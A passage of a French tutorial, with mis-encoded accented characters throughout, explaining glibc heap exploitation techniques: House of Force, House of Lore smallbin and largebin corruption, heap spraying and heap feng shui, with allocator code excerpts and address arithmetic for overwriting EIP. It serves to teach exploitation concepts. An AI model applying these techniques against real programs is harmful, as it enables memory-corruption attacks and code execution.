Par exemple, si le programme demande √† l'utilisateur un nombre, nous pourrions entrer 48 et pointer le pointeur de malloc modifiable vers les 4 octets suivants (qui pourraient appartenir √† l'EBP avec un peu de chance, ainsi le 48 reste derri√®re, comme s'il s'agissait de l'en-t√™te size). De plus, l'adresse ptr-4+48 doit remplir plusieurs conditions (dans ce cas ptr=EBP), c'est-√†-dire, 8 < ptr-4+48 < av->system\_mem.

Si cela est satisfait, lorsque le prochain malloc est appel√©, qui √©tait malloc(40), l'adresse du EBP lui sera attribu√©e. Si l'attaquant peut √©galement contr√¥ler ce qui est √©crit dans ce malloc, il peut √©craser √† la fois l'EBP et l'EIP avec l'adresse qu'il souhaite.

Je pense que c'est parce que lorsque free() est appel√©, il enregistre que l'adresse pointant vers l'EBP de la pile contient un morceau de taille parfaite pour le nouveau malloc() √† r√©server, il lui attribue donc cette adresse.

**The House of Force**

Il est n√©cessaire de :

* Un d√©bordement d'un morceau permettant d'√©craser le wilderness
* Un appel √† malloc() avec la taille d√©finie par l'utilisateur
* Un appel √† malloc() dont les donn√©es peuvent √™tre d√©finies par l'utilisateur

La premi√®re chose √† faire est d'√©craser la taille du morceau wilderness avec une valeur tr√®s grande (0xffffffff), de sorte que toute demande de m√©moire suffisamment grande sera trait√©e dans \_int\_malloc() sans avoir besoin d'√©tendre le tas.

La deuxi√®me chose est de modifier av->top pour qu'il pointe vers une zone de m√©moire sous le contr√¥le de l'attaquant, comme la pile. Dans av->top, on mettra \&EIP - 8.

Nous devons √©craser av->top pour qu'il pointe vers la zone de m√©moire sous le contr√¥le de l'attaquant :

victime = av->top;

reste = chunck\_at\_offset(victime, nb);

av->top = reste;

Victim r√©cup√®re la valeur de l'adresse du morceau wilderness actuel (l'actuel av->top) et reste est exactement la somme de cette adresse plus la quantit√© d'octets demand√©e par malloc(). Ainsi, si \&EIP-8 est √† 0xbffff224 et av->top contient 0x080c2788, alors la quantit√© que nous devons r√©server dans le malloc contr√¥l√© pour que av->top pointe vers $EIP-8 pour le prochain malloc() sera :

0xbffff224 - 0x080c2788 = 3086207644.

Ainsi, la valeur modifi√©e sera enregistr√©e dans av->top et le prochain malloc pointera vers l'EIP et pourra l'√©craser.

Il est important de savoir que la taille du nouveau morceau wilderness soit plus grande que la demande faite par le dernier malloc(). C'est-√†-dire, si le wilderness pointe vers \&EIP-8, la taille sera juste dans le champ EBP de la pile.

**The House of Lore**

**Corruption SmallBin**

Les morceaux lib√©r√©s sont plac√©s dans le bin en fonction de leur taille. Mais avant d'√™tre plac√©s, ils sont stock√©s dans des bacs non tri√©s. Lorsqu'un morceau est lib√©r√©, il n'est pas imm√©diatement plac√© dans son bin mais reste dans les bacs non tri√©s. Ensuite, s'il est r√©serv√© un nouveau morceau et que le pr√©c√©dent lib√©r√© peut √™tre utilis√©, il est renvoy√©, mais s'il est r√©serv√© plus grand, le morceau lib√©r√© dans les bacs non tri√©s est plac√© dans son bin appropri√©.

Pour atteindre le code vuln√©rable, la demande de m√©moire doit √™tre sup√©rieure √† av->max\_fast (72 normalement) et inf√©rieure √† MIN\_LARGE\_SIZE (512).

Si dans le bin il y a un morceau de la taille appropri√©e √† ce qui est demand√©, il est renvoy√© apr√®s avoir √©t√© d√©tach√© :

bck = victime->bk; Pointe vers le morceau pr√©c√©dent, c'est la seule information que nous pouvons modifier.

bin->bk = bck; Le morceau avant-dernier devient le dernier, si bck pointe vers la pile, le prochain morceau r√©serv√© recevra cette adresse

bck->fd = bin; La liste est ferm√©e en faisant pointer celui-ci vers bin

Il est n√©cessaire:
R√©servez deux malloc, de sorte que le premier puisse √™tre d√©bord√© apr√®s que le second ait √©t√© lib√©r√© et plac√© dans son bin (c'est-√†-dire qu'un malloc plus grand que le deuxi√®me morceau ait √©t√© r√©serv√© avant le d√©bordement)

Le malloc r√©serv√© √† l'adresse choisie par l'attaquant doit √™tre contr√¥l√© par l'attaquant.

L'objectif est le suivant, si nous pouvons d√©border un tas qui a en dessous un morceau d√©j√† lib√©r√© et dans son bin, nous pouvons alt√©rer son pointeur bk. En modifiant le pointeur bk et si ce morceau devient le premier de la liste du bin et est r√©serv√©, le bin sera tromp√© et lui dira que le dernier morceau de la liste (le prochain √† offrir) est √† l'adresse fausse que nous avons sp√©cifi√©e (par exemple, le stack ou la GOT). Ainsi, si un autre morceau est r√©serv√© et que l'attaquant a des autorisations dessus, un morceau sera donn√© √† la position souhait√©e et pourra y √©crire.

Apr√®s avoir lib√©r√© le morceau modifi√©, il est n√©cessaire de r√©server un morceau plus grand que celui lib√©r√©, de sorte que le morceau modifi√© sorte des unsorted bins et soit plac√© dans son bin.

Une fois dans son bin, il est temps de modifier le pointeur bk via le d√©bordement pour qu'il pointe vers l'adresse que nous voulons √©craser.

Ainsi, le bin devra attendre que malloc() soit appel√© suffisamment de fois pour que le bin modifi√© soit r√©utilis√© et trompe le bin en lui faisant croire que le morceau suivant est √† l'adresse fausse. Ensuite, le morceau qui nous int√©resse sera donn√©.

Pour ex√©cuter la vuln√©rabilit√© le plus rapidement possible, l'id√©al serait : R√©server le morceau vuln√©rable, r√©server le morceau √† modifier, lib√©rer ce morceau, r√©server un morceau plus grand que celui √† modifier, modifier le morceau (vuln√©rabilit√©), r√©server un morceau de m√™me taille que celui viol√© et r√©server un deuxi√®me morceau de m√™me taille qui pointera vers l'adresse choisie.

Pour prot√©ger cette attaque, la v√©rification typique que le morceau "n'est pas" faux est utilis√©e : on v√©rifie si bck->fd pointe vers la victime. C'est-√†-dire que dans notre cas, si le pointeur fd\* du morceau faux point√© dans le stack pointe vers la victime. Pour contourner cette protection, l'attaquant devrait √™tre capable d'√©crire d'une mani√®re ou d'une autre (probablement via le stack) √† l'adresse appropri√©e l'adresse de la victime. Ainsi, cela ressemblera √† un morceau r√©el.

**Corruption LargeBin**

Les m√™mes exigences que pr√©c√©demment sont n√©cessaires, ainsi que d'autres, en plus les morceaux r√©serv√©s doivent √™tre sup√©rieurs √† 512.

L'attaque est similaire √† la pr√©c√©dente, c'est-√†-dire qu'il faut modifier le pointeur bk et toutes ces appels √† malloc(), mais il faut √©galement modifier la taille du morceau modifi√© de telle sorte que cette taille - nb soit < MINSIZE.

Par exemple, il faudra mettre la taille √† 1552 pour que 1552 - 1544 = 8 < MINSIZE (la soustraction ne peut pas √™tre n√©gative car elle compare un unsigned)

De plus, un correctif a √©t√© introduit pour le rendre encore plus compliqu√©.

**Heap Spraying**

Il s'agit essentiellement de r√©server autant de m√©moire que possible pour les tas et de les remplir avec un matelas de nops suivi d'une shellcode. De plus, 0x0c est utilis√© comme matelas. On essaiera de sauter √† l'adresse 0x0c0c0c0c, et ainsi, si une adresse √† laquelle ce matelas doit √™tre appel√© est √©cras√©e, le saut se fera l√†-bas. Fondamentalement, la tactique consiste √† r√©server autant que possible pour voir si un pointeur est √©cras√© et √† sauter √† 0x0c0c0c0c en esp√©rant qu'il y ait des nops l√†-bas.

**Heap Feng Shui**

Il consiste √† sementer la m√©moire en r√©servant et en lib√©rant des morceaux de mani√®re √† ce qu'il reste des morceaux r√©serv√©s entre des morceaux libres. Le tampon √† d√©border sera plac√© dans l'un de ces morceaux.
